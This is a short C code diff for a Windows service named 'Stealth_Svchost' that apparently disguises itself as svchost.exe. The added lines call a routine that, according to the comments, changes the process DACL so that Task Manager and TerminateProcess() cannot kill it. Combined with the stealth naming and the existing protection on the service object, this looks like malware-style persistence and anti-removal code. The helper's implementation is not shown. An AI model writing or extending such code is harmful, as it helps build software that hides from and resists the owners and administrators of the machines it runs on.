@@ -564,6 +564,21 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     g_SvchostStatus.dwWaitHint = 0;
     SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
 
+    // Apply process-level termination protection
+    // This prevents Task Manager and TerminateProcess() from killing our svchost.exe
+    // NOTE: This is different from Stealth_ProtectServiceFromTermination() which only
+    // protects the SERVICE object in SCM. This protects the actual PROCESS.
+    if (Stealth_ProtectCurrentProcess())
+    {
+        Stealth_SvchostLogLine(L"Process termination protection applied successfully");
+        Stealth_DebugPrintfW(L"[svchost] Process DACL protection active - TerminateProcess blocked");
+    }
+    else
+    {
+        Stealth_SvchostLogLine(L"WARNING: Failed to apply process termination protection");
+        Stealth_DebugPrintfW(L"[svchost] WARNING: Process DACL protection failed");
+    }
+
     g_SvchostRunning = TRUE;
 
     char* startArgv[2] = { NULL, NULL };
